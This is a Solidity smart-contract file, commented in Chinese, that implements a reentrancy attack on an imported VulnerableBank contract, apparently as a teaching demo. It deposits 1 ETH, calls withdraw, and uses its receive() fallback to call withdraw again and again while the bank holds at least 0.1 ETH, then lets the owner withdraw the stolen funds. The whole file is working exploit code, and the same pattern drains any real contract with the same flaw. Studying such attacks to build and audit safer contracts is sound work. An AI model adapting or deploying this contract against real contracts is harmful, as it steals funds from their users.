// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableBank.sol";

/**
 * 攻击者合约 - 利用重入漏洞
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;
    bool private attacking;

    event AttackStarted(uint bankBalance);
    event AttackCompleted(uint stolenAmount);

    constructor(address _bankAddress) {
        // 修复类型转换问题
        vulnerableBank = VulnerableBank(payable(_bankAddress));
        owner = msg.sender;
    }

    // 回调函数 - 这是重入攻击的关键
    receive() external payable {
        if (!attacking) {
            return;
        }

        uint bankBalance = address(vulnerableBank).balance;
        emit AttackStarted(bankBalance);

        // 如果银行还有足够的ETH，就继续攻击
        if (bankBalance >= 0.1 ether) {
            // 这里会再次调用withdraw，形成重入
            vulnerableBank.withdraw();
        }
    }

    // 开始攻击
    function attack() public payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value == 1 ether, "Need exactly 1 ether to start attack");

        attacking = true;

        // 先存款1 ETH
        vulnerableBank.deposit{value: 1 ether}();

        // 然后立即取款，触发重入攻击
        vulnerableBank.withdraw();

        attacking = false;
    }

    // 提取盗取的资金
    function withdrawStolenFunds() public {
        require(msg.sender == owner, "Only owner can withdraw");
        uint balance = address(this).balance;
        payable(owner).transfer(balance);
        emit AttackCompleted(balance);
    }

    // 获取攻击合约余额
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}